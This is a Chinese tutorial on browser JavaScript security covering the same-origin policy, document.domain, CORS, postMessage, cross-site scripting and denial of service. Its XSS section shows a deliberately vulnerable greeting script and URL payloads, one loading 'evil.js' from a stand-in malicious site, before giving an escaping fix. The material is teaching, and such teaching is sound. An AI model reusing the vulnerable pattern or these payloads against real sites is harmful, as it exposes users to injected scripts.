[toc]

### 1. JavaScript 不能做什么

`Web` 浏览器针对恶意代码的第一条防线就是它们不支持某些功能。例如，客户端 `JavaScript` 没有权限来写入或删除客户计算机上的任意文件或列出任意目录。  

类似地，客户端 `JavaScript` 没有任何通用的网络能力。客户端 `JavaScript` 程序可以对HTTP协议编程；并且 `HTML5` 有一个附属标准叫 `WebSockets`，定义了一个类套接字的 `API`，用于和指定的服务器通信。但是，这些 `API` 都不允许对于范围更广的网络进行直接访问。  

浏览器针对恶意代码的第二条防线是在自己支持的某些功能上施加限制。以下是一些功能限制：  

+ `JavaScript` 程序可以打开一个新的浏览器窗口，但是为了防止广告商滥用弹出窗口，很多浏览器限制了这一功能，使得只有为了响应鼠标单击这样的用户触发事件的时候，才能使用它。  

+ `JavaScript` 程序可以关闭自己打开的浏览器窗口，但是不允许它不经过用户确认就关闭其他的窗口。  

+ HTML `FileUpload` 元素的 `value` 属性是只读的。如果可以设置这个属性，脚本就能设置它为任意期望的文件名，从而导致表单上传指定文件（比如密码文件）的内容到服务器。  

+ 脚本不能读取从不同服务器载入的文档的内容，除非这个就是包含该脚本的文档。类似地，一个脚本不能在来自不同服务器的文档上注册事件监听器。这就防止脚本窃取其他页面的用户输入（例如，组成一个密码项的键盘单击过程）。这一限制叫做同源策略（sameoriginpolicy），下一节将更详细地介绍它。  

### 2. 同源策略

同源策略是对 `JavaScript` 代码能够操作哪些Web内容的一条完整的安全限制。当 `Web` 页面使用多个 `<iframe>` 元素或者打开其他浏览器窗口的时候，这一策略通常就会发挥作用。在这种情况下，同源策略负责管理窗口或窗体中的 `JavaScript` 代码以及和其他窗口或帧的交互。具体来说，脚本只能读取和所属文档来源相同的窗口和文档的属性  。

文档的来源包含协议、主机，以及载入文档的 `URL` 端口。从不同 `Web` 服务器载入的文档具有不同的来源。通过同一主机的不同端口载入的文档具有不同的来源。使用 `http:` 协议载入的文档和使用 `https:` 协议载入的文档具有不同的来源，即使它们来自同一个服务器。  

脚本本身的来源和同源策略并不相关，相关的是脚本所嵌入的文档的来源，理解这一点很重要。例如，假设一个来自主机A的脚本被包含到（使用 `<script>` 标记的 `src` 属性）宿主 B 的一个 `Web` 页面中。这个脚本的来源是主机 B，并且可以完整地访问包含它的文档的内容。如果脚本打开一个新窗口并载入来自主机B的另一个文档，脚本对这个文档的内容也具有完全的访问权限。但是，如果脚本打开第三个窗口并载入一个来自主机 C 的文档（或者是来自主机 A），同源策略就会发挥作用，阻止脚本访问这个文档。  

实际上，同源策略并非应用于不同源的窗口中的所有对象的所有属性。不过它应用到了其中的大多数属性，尤其是对 `Document` 对象的几乎所有属性而言。凡是包含另一个服务器中文档的窗口或窗体，都是同源策略适用的范围。如果脚本打开一个窗口，脚本也可以关闭它，但不能以任何方式查看窗口内部。同源策略还应用于使用 `XMLHttpRequest` 生成的 `HTTP`请求。这个对象允许客户端 `JavaScript` 生成任意的 `HTTP` 请求到脚本所属文档的 `Web` 服务器，但是不允许脚本和其他 `Web` 服务器通信。  

#### 2.1 不严格的同源策略

同源策略给那些使用多个子域的大站点带来了一些问题。例如，来自 home.example.com 的文档里的脚本想要合法地读取从 developer.example.com 载入的文档的属性，或者来自 orders.example.com 的脚本可能需要读 catalog.example.com 上的文档的属性。为了支持这种类型的多域名站点，可以使用 `Document` 对象的 `domain` 属性。在默认情况下，属性 `domain` 存放的是载入文档的服务器的主机名。可以设置这一属性，不过使用的字符串必须具有有效的域前缀或它本身。因此，如果一个 `domain` 属性的初始值是字符串 “home.example.com”，就可以把它设置为字符串 “example.com”，但是 不能设置为 “home.example” 或 “ample.com”。另外，`domain` 值中必须有一个点号，不能把它设置为 “com” 或其他顶级域名。如果两个窗口（或窗体）包含的脚本把 `domain` 设置成了相同的值，那么这两个窗口就不再受同源策略的约束，它们可以相互读取对方的属性。例如，从 order.example.com 和 catalog.example.com 载入的文档中的脚本可以把它们的 `document.domain` 属性都设置为 “example.com”，这样一来，这些文档就有了同源性，可以互相读取属性。  

不严格的同源策略的第二项技术已经标准化为：跨域资源共享（Cross-Origin Resource Sharing，参见 http://www.w3.org/TR/cors/）。这个标准草案用新的 “Origin：”请求头和新的 Access-Control-AllowOrigin 响应头来扩展 HTTP。它允许服务器用头信息显式地列出源，或使用通配符来匹配所有的源并允许由任何地址请求文件。类似 Firefox3.5 和 Safari 4 的浏览器可以使用这种新的头信息来允许跨域 HTTP 请求，这样 `XMLHttpRequest` 就不会被同源策略所限制了。  

另一种新技术，叫做跨文档消息（cross-document messaging），允许来自一个文档的脚本可以传递文本消息到另一个文档里的脚本，而不管脚本的来源是否不同。调用 `Window` 对象上的`postMessage()` 方法，可以异步传递消息事件（可以用 `onmessage` 事件句处理程序函数来处理它）到窗口的文档里。一个文档里的脚本还是不能调用在其他文档里的方法和读取属性，但它们可以用这种消息传递技术来实现安全的通信。  

### 3. 跨站脚本

如果 `Web` 页面动态地产生文档内容，并且这些文档内容是基于用户提交的数据的，而并没有通过从中移除任何嵌入的 `HTML` 标签来 “消毒” 的话，那么这个 `Web` 页面很容易遭到跨站脚本攻击。来看一个小例子，考虑如下的 `Web` 页面，它使用 `JavaScript` 通过用户的名字来向用户问好：  

```html
<script>
    var name = decodeURIComponent(window.location.search.substring(1)) || "";
    document.write("Hello " + name);
</script>
```

这两行脚本使用 `window.location.search` 来获得它们自己的 URL 中以 “?” 开始的部分。它使用`document.write()` 来向文档添加动态生成的内容。这个页面专门通过如下的一个 `URL` 来调用：  

```
http://www.example.com/greet.html?David
```

这么使用的时候，它会显示文本“Hello David”。但考虑一下，当用下面的 `URL` 来调用它，会发生什么情况：  

```
http://www.example.com/greet.html?%3Cscript%3Ealert('David')%3C/script%3E
```

只用这个 `URL` ，脚本会动态地生成另一个脚本（ `%3C` 和 `%3E` 是一个尖括号的编码）。在这个例子中，注入的脚本只显示一个对话框，这还是相对较好的情况。但是，如果考虑以下的情况：  

```
http://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
```

之所以叫做跨站脚本攻击，就是因为它涉及多个站点。站点 B（或者站点 C ）包含一个专门构造的到站点 A 的链接（就像上面的那个），它会注入一个来自站点B的脚本。脚本 eval.js 驻留在恶意站点 B 中，但现在，它嵌入到站点 A 中，并且可以对站点 A 的内容进行任何想要的操作。  

通常，防止 XSS 攻击的方式是，在使用任何不可信的数据来动态的创建文档内容之前，从中移除 `HTML` 标签。可以通过添加如下一行代码来移除 `<script>` 标签两边的尖括号，从而修复前面给出的 `greet.html` 文件。  

```js
name = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
```

上面的简单代码替换把字符串中所有的尖括号替换成它们对应的 `HTML` 实体，也就是说将字符串中任意 `HTML` 标签进行转义和过滤删除（deactivate）处理。IE8定义了一个更加微妙的 `toStaticHTML()` 方法，可以移除 `<script>` 标签（和其他潜在的可执行内容）而不修改不可执行的 `HTML`。  

`HTML5` 的内容安全策略则更进一步，它为 `<iframe>` 元素定义了一个 `sandbox` 属性。在实现之后，它允许显示不可信的内容，并自动禁用脚本。  

### 4. 拒绝服务攻击

如果访问了启用 `JavaScript` 功能的一个恶意 `Web` 站点，这个站点可以使用一个 `alert()` 对话框的无限循环占用浏览器，或者用一个无限循环或没有意义的计算来占用 CPU。

某些浏览器可以检测运行时间很长的脚本，并且让用户选择终止它们。但是恶意脚本可以使用`window.setInterval()` 这样的方法来占用 CPU，并通过分配很多的内存来攻击你的系统。`Web` 浏览器并没有通用的办法来防止这种笨重的攻击手法。实际上，由于没有人会返回一个滥用这种脚本的网站，因此这在 `Web`上不是一个常见的问题。  